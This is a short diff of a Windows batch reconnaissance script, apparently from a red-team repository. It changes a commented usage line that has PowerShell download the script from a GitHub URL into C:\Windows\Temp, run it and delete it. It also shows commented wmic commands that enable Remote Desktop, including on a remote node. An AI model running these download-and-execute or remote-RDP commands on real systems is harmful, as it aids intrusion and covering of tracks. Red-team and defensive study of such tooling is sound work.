@@ -1,4 +1,4 @@
-rem powershell.exe "wget https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Host_Recon_WMIC.bat -o C:\Windows\Temp\Host_Recon_WMIC.bat;C:\Windows\Temp\Host_Recon_WMIC.bat;del C:\Windows\Temp\Host_Recon_WMIC.bat"
+rem powershell.exe "wget https://raw.githubusercontent.com/t3l3m3try/Red_Team/master/Discovery/Host_Recon_WMIC.bat -o C:\Windows\Temp\Host_Recon_WMIC.bat;C:\Windows\Temp\Host_Recon_WMIC.bat;del C:\Windows\Temp\Host_Recon_WMIC.bat"
 echo ::::HOST_Enumeration::::
 echo ::::OS_Specifics::::
 
@@ -80,3 +80,4 @@ REM echo ::::Enable_Remote_Desktop::::
 
 REM wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
 REM wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"
+
